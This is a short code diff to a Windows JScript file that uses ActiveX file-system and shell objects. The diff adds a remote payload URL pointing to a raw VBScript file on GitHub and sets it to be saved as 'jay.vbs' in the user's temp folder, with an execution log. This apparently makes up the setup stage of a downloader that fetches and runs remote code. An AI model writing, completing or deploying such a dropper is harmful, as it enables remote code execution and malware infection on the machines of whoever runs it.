@@ -4,9 +4,9 @@ var fso = new ActiveXObject("Scripting.FileSystemObject");
 var shell = new ActiveXObject("WScript.Shell");
 
 // Define the URL for the payload and the local path for saving it
-var payloadUrl = ""; 
+var payloadUrl = "https://github.com/aledreamer1234-lgtm/444/raw/refs/heads/main/jayz.vbs"; 
 var tempFolder = fso.GetSpecialFolder(2); // %TEMP% directory
-var payloadPath = fso.BuildPath(tempFolder, "");
+var payloadPath = fso.BuildPath(tempFolder, "jay.vbs");
 var logFilePath = fso.BuildPath(tempFolder, "js_execution.log");
 
 // Open a log file for recording events. Appending mode (8) ensures old logs aren't overwritten.
